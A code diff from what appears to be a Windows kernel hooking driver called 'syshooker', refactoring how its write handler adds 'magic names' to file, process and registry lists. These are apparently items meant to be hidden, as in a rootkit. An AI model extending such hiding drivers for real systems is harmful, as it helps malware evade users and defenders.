@@ -389,30 +389,11 @@ NTSTATUS SyshookerWrite(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
 
 			kprintf("[+] syshooker IRQ_WRITE: newNameNode: %ws.\n", NewNameNode->NameBuffer);
 
-			// uncomment here
-			// status = appendNameNode(llHead, NewNameNode)
-
-			NameNode* llHead = nullptr;
-			if (request->Target == TARGET_FILE) {
-				llHead = SettingsNew.FileMagicNamesHead;
-				kprintf("[+] syshooker IRQ_WRITE: should add to FILE. Head is now %p\n", llHead);
-			}
-			else if (request->Target == TARGET_PROCESS) {
-				llHead = SettingsNew.ProcessMagicNamesHead;
-				kprintf("[+] syshooker IRQ_WRITE: should add to PROCESS. Head is now %p\n", llHead);
-			}
-			else if (request->Target == TARGET_REGISTRY) {
-				llHead = SettingsNew.RegistryMagicNamesHead;
-				kprintf("[+] syshooker IRQ_WRITE: should add to REGISTRY. Head is now %p\n", llHead);
-			}
-			else {
-				status = STATUS_INVALID_PARAMETER;
+			status = appendNameNode(request->Target, NewNameNode);
+			if (!NT_SUCCESS(status)) {
 				FreeNameNode(NewNameNode);
 				break;
 			}
-			
-
-			FreeNameNode(NewNameNode); // remove this and implement AppendNameNode
 		}
 		else if (request->Operation == OPERATION_REMOVE) {
 			// TODO
